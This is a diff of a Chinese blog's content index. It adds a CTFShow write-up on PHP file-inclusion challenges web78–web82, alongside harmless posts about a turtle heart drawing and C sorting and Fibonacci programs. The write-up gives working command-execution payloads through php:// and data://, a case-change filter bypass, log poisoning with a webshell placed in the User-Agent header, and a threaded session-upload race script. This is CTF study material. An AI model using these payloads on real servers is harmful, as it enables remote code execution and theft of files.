+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web78.png" alt></p>
+<ol start="2">
+<li>尝试使用 php://input 协议:</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"ls"</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">"tac flag.php"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web78_1.png" alt></p>
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web78_2.png" alt></p>
+<p><strong>方法二：</strong></p>
+<pre><code>1. 尝试使用 php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web78_3.png" alt></p>
+<p>​    base64解码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:55:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:55:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$flag=<span class="string">"ctfshow&#123;db4b1df7-****-4633-ac61-717d14afa306&#125;"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>​    得到了 flag.</p>
+<h2 id="web79——文件包含"><a href="#web79——文件包含" class="headerlink" title="web79——文件包含"></a>web79——文件包含</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先发现题目 使用 str_replace 将php替换为了 ???</p>
+<p><strong>方法一：</strong></p>
+<pre><code>1. 使用 大写 绕过:</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"ls"</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">"tac flag.php"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web79.png" alt></p>
+<p><strong>方法二：</strong></p>
+<pre><code>1. 使用 mv 命令 将 flag.php 重命名为 a.txt</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"mv flag.php a.txt"</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<pre><code>2. 查看 a.txt </code></pre><p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web79_2.png" alt></p>
+<p><strong>方法三：</strong></p>
+<ol>
+<li>使用 data:// 协议:</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 未使用 base64 编码</span></span><br><span class="line">?file=data:<span class="comment">//text/plain,<span class="meta">&lt;?pHp</span> system("tac f*");<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">// 使用 base64 编码 </span></span><br><span class="line"><span class="comment">// <span class="meta">&lt;?php</span> system('tac flag.php'); = base64 = PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web79_1.png" alt></p>
+<h2 id="web80——文件包含——日志shell"><a href="#web80——文件包含——日志shell" class="headerlink" title="web80——文件包含——日志shell"></a>web80——文件包含——日志shell</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了 php 和 data:</p>
+<p><strong>方法一：</strong></p>
+<pre><code>1. 尝试使用 php://input：</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post：</span><br><span class="line">   	<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">'tac fl0g.php'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web80.png" alt></p>
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web81_1.png" alt></p>
+<pre><code>2. 尝试使用 data:// 协议并 大写 DATA:// 但绕过失败</code></pre><p><strong>方法二：</strong></p>
+<pre><code>1. 利用 日志 shell ： /var/log/nginx/access.log
+2. bp 中 user-agent 写入一句话</code></pre><p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web80_2.png" alt></p>
+<pre><code>3. 尝试连接:</code></pre><p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web80_3.png" alt></p>
+<p>​    4. 查找 flag（省略）</p>
+<h2 id="web81——文件包含——日志shell"><a href="#web81——文件包含——日志shell" class="headerlink" title="web81——文件包含——日志shell"></a>web81——文件包含——日志shell</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>可以发现文中将 php/data/: 都替换为了 ???;</li>
+<li>尝试是否能查看 服务器日志: ?file=/var/log/nginx/access.log — 成功</li>
+</ol>
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web81.png" alt></p>
+<p>   3.将一句话木马 写入到 User Agent当中: HackBar/Burp:</p>
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web81_1.png" alt></p>
+<p>   4.再次查看日志，日志是否包含了 一句话: — 有</p>
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web81_2.png" alt></p>
+<p>   5.蚁剑/菜刀连接:</p>
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web81_3.png" alt></p>
+<p>   查找flag:</p>
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web81_4.png" alt></p>
+<h2 id="web82——文件包含"><a href="#web82——文件包含" class="headerlink" title="web82——文件包含"></a>web82——文件包含</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 19:34:45</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析：</strong></p>
+<p>把 php,data,:, . 都替换为了 ??? ; 这些协议都用不了可以考虑尝试用 session对话文件包含</p>
+<p>​    1.编辑一个文件上传的页面:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"目标URL"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"2333"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>​    2.将 “目标URL” 跟改为题目地址: 上传一个 txt 文件 内容字母数字随便都可</p>
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web82.png" alt></p>
+<pre><code>3. Bp 抓包:</code></pre><p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web82_1.png" alt></p>
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web82_2.png" alt></p>
+<p>​    如图所示 在头部 加入 Cookie:PHPSESSID=test ，将 PHP_SESSION_UPLOAD_PROGRESS 内容修改为: <?php system('tac f*.php');?>  再将 Payloads type 设置为 Null payloads, 开启爆破</p>
+<pre><code>4. 再爆破一个 请求地址 : ?file=/tmp/sess_test  ; sess_test就是产生的一个临时文件 test就是刚刚设置的 Cookie:PHPSESSID=test，现在需要读取这个文件，由于此文件可能会立马删除，因此也需要一个 爆破请求:</code></pre><p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web82_3.png" alt></p>
+<pre><code>5. 观察结果: 在读取目标的请求爆破中查看 响应结果：如下图</code></pre><p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web82_4.png" alt></p>
+<pre><code>6. 当然也可以写一个 脚本来实现爆破：奈何我是菜鸡🐔一只，参考了大佬的脚本:</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://59af8191-fdc8-414f-bb1c-f2726b946851.challenge.ctf.show:8080/'</span></span><br><span class="line"></span><br><span class="line">sessID = <span class="string">'test'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Write</span><span class="params">(session)</span>:</span></span><br><span class="line">	<span class="keyword">while</span> event.isSet():</span><br><span class="line">		file = io.BytesIO(<span class="string">b'a'</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">		response = session.post(</span><br><span class="line">			url,</span><br><span class="line">			cookies=&#123;<span class="string">'PHPSESSID'</span>: sessID&#125;,</span><br><span class="line">			data=&#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'&lt;?php system("cat *.php");?&gt;'</span>&#125;,</span><br><span class="line">			files=&#123;<span class="string">'file'</span>: (<span class="string">'test.txt'</span>, file)&#125;</span><br><span class="line">		)</span><br><span class="line">	<span class="comment"># print(response.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Read</span><span class="params">(session)</span>:</span></span><br><span class="line">	<span class="keyword">while</span> event.isSet():</span><br><span class="line">		response = session.get(url + <span class="string">'?file=/tmp/sess_'</span> +sessID)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'test'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">			print(response.text)</span><br><span class="line">			event.clear()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(<span class="string">'+'</span>*<span class="number">10</span> + <span class="string">'ReTrying'</span> + <span class="string">'+'</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	event = threading.Event()</span><br><span class="line">	event.set()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=Write, args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=Read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
+
+<p><img src="//czheisenberg.github.io/2021/07/27/CTFShow-文件包含笔记/web82_5.png" alt></p>
+]]></content>
+      <categories>
+        <category>CTF笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Painting heart</title>
+    <url>/2019/07/16/Painting-heart/</url>
+    <content><![CDATA[<h1 id="使用python画❤"><a href="#使用python画❤" class="headerlink" title="使用python画❤"></a>使用python画❤</h1><p>利用python画一个❤  </p>
+<p>导入 turtle 库 并起一个别名为： t  </p>
+<p>这样便于操作：  </p>
+<p>有点粗糙！</p>
+<p>源代码：</p>
+<a id="more"></a>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle <span class="keyword">as</span> t</span><br><span class="line"><span class="comment">#画人</span></span><br><span class="line">t.color(<span class="string">'black'</span>)</span><br><span class="line">t.pensize(<span class="number">2</span>)</span><br><span class="line">t.circle(<span class="number">40</span>)</span><br><span class="line">t.right(<span class="number">90</span>)</span><br><span class="line">t.forward(<span class="number">110</span>)</span><br><span class="line">t.right(<span class="number">45</span>)</span><br><span class="line">t.forward(<span class="number">60</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.backward(<span class="number">60</span>)</span><br><span class="line">t.left(<span class="number">43</span>)</span><br><span class="line">t.pendown()</span><br><span class="line">t.goto(<span class="number">45</span>,<span class="number">-111</span>)</span><br><span class="line">t.goto(<span class="number">45</span>,<span class="number">-180</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.goto(<span class="number">0</span>,<span class="number">-45</span>)</span><br><span class="line">t.left(<span class="number">90</span>)</span><br><span class="line">t.pendown()</span><br><span class="line">t.goto(<span class="number">70</span>,<span class="number">-45</span>)</span><br><span class="line">t.goto(<span class="number">89</span>,<span class="number">-30</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.goto(<span class="number">0</span>,<span class="number">-55</span>)</span><br><span class="line">t.pendown()</span><br><span class="line">t.goto(<span class="number">72</span>,<span class="number">-55</span>)</span><br><span class="line">t.right(<span class="number">34</span>)</span><br><span class="line">t.forward(<span class="number">22</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.left(<span class="number">34</span>)</span><br><span class="line">t.goto(<span class="number">199</span>,<span class="number">-50</span>)</span><br><span class="line">t.pendown()</span><br><span class="line"></span><br><span class="line">t.pensize(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t.delay(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#画❤</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">        t.right(<span class="number">1</span>)</span><br><span class="line">        t.forward(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t.color(<span class="string">'red'</span>,<span class="string">'pink'</span>)</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.left(<span class="number">140</span>)</span><br><span class="line">t.forward(<span class="number">111.65</span>)</span><br><span class="line">h()</span><br><span class="line">t.left(<span class="number">120</span>)</span><br><span class="line">h()</span><br><span class="line">t.forward(<span class="number">111.65</span>)</span><br><span class="line">t.end_fill()</span><br><span class="line"></span><br><span class="line">t.hideturtle()</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/07/16/Painting-heart/3.gif" alt></p>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>fibonacci sequence</title>
     <url>/2019/07/16/fibonacci-sequence/</url>
     <content><![CDATA[<h1 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h1><h2 id="fibonacci-sequence"><a href="#fibonacci-sequence" class="headerlink" title="fibonacci sequence"></a>fibonacci sequence</h2><p>利用数组求出斐波拉契数列前20项:  </p>
@@ -682,24 +718,6 @@
 
 <p>运行结果：  </p>
 <p><img src="//czheisenberg.github.io/2019/07/16/fibonacci-sequence/2.png" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Welcome</title>
-    <url>/2019/07/15/Welcome/</url>
-    <content><![CDATA[<h1 id="我的第一个博客"><a href="#我的第一个博客" class="headerlink" title="我的第一个博客"></a>我的第一个博客</h1><p>创建第一个C语言程序“Hello World”<br>源代码：</p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Hello World!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：<br>Hello World</p>
-<p><img src="//czheisenberg.github.io/2019/07/15/Welcome/1.png" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -766,23 +784,16 @@
       </tags>
   </entry>
   <entry>
-    <title>三角形的类型和面积</title>
-    <url>/2019/08/27/%E4%B8%89%E8%A7%92%E5%BD%A2%E7%9A%84%E7%B1%BB%E5%9E%8B%E5%92%8C%E9%9D%A2%E7%A7%AF/</url>
-    <content><![CDATA[<h1 id="计算三角形的类型和面积"><a href="#计算三角形的类型和面积" class="headerlink" title="计算三角形的类型和面积"></a>计算三角形的类型和面积</h1><h2 id="海伦公式："><a href="#海伦公式：" class="headerlink" title="海伦公式："></a>海伦公式：</h2><p>海伦公式，传说中是古代的叙拉古国王希伦二世发现的公式，利用三角形的三边来求三角形的面积，但后人求证出此公式其实是 <strong>阿基米德</strong>这个老头发现的！  （详细情况请自行百科：）  </p>
-<p>ps:中国宋代的数学家秦九韶在1247年独立提出了“三斜求积术” </p>
+    <title>冒泡法排序</title>
+    <url>/2019/07/17/%E5%86%92%E6%B3%A1%E6%B3%95%E6%8E%92%E5%BA%8F/</url>
+    <content><![CDATA[<h1 id="冒泡法排序"><a href="#冒泡法排序" class="headerlink" title="冒泡法排序"></a>冒泡法排序</h1><p>冒泡法排序：  </p>
+<p>源代码：  </p>
 <a id="more"></a>
 
-<p>一个三角形 三边分别为： a、b、c，s为面积  </p>
-<p><em>s=(a+b+c)/2</em>  </p>
-<p><em>s=根号{s(s-a)(s-b)(s-c)}</em> </p>
-<p>此公式就摆脱了 高与底  </p>
-<h2 id="include”math-h”"><a href="#include”math-h”" class="headerlink" title="#include”math.h”"></a>#include”math.h”</h2><p><strong>&lt;math.h&gt;</strong> 头文件包含了一系列与数学计算相关的函数和宏。  </p>
-<h2 id="sqrt-平方根计算"><a href="#sqrt-平方根计算" class="headerlink" title="sqrt(平方根计算)"></a>sqrt(平方根计算)</h2><p>sqrt 就是公式中的根号，用法： sqrt(xxxx)</p>
-<p>源代码：  </p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"math.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">float</span> a,b,c,area,s;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入三角形的三边长：\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%f%f%f"</span>,&amp;a,&amp;b,&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(a+b&gt;c||a+c&gt;b||b+c&gt;a)<span class="comment">// 两边之和大于第三边 </span></span><br><span class="line">		&#123;</span><br><span class="line">			s=(a+b+c)/<span class="number">2</span>;</span><br><span class="line">			area=(<span class="keyword">float</span>)<span class="built_in">sqrt</span>(s*(s-a)*(s-b)*(s-c));<span class="comment">//海伦公式 </span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"三角形的面积：%f\n"</span>,area);</span><br><span class="line">			<span class="keyword">if</span>(a==b&amp;&amp;a==c)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"此为：等边三角形！\n"</span>);	<span class="comment">//判断等边 </span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(a==b||a==c||b==c)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"此为：等腰三角形！\n"</span>);<span class="comment">//判断等腰 </span></span><br><span class="line">				 <span class="keyword">else</span> <span class="keyword">if</span>(a*a+b*b==c*c||a*a+c*c==b*b||b*b+c*c==a*a) <span class="comment">//判断直角 </span></span><br><span class="line">			 			<span class="built_in">printf</span>(<span class="string">"此为：直角三角形！\n"</span>);</span><br><span class="line">					  <span class="keyword">else</span>	</span><br><span class="line">					  	<span class="built_in">printf</span>(<span class="string">"此为：普通三角形！\n"</span>);<span class="comment">//其他普通三角形 </span></span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"不能构成三角形！\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入%d个数：\n"</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=N<span class="number">-1</span>;j&gt;i;j--)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(a[j]&gt;a[j<span class="number">-1</span>])          <span class="comment">// &gt; 为降序，&lt; 为升序</span></span><br><span class="line">						&#123;</span><br><span class="line">							t=a[j],a[j]=a[j<span class="number">-1</span>],a[j<span class="number">-1</span>]=t;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	